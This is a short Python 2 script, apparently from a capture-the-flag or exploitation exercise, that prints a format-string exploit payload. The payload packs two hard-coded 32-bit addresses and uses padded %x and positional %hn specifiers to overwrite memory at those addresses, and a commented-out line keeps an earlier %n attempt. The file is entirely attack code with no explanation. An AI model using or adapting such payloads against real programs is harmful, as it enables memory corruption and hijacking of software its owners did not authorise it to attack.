#!/usr/bin/env python

import os
import struct

def main():
    #payload = "\xd0\x83\x04\x08%4$n"
    payload = "\x3c\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"
    print payload

main()
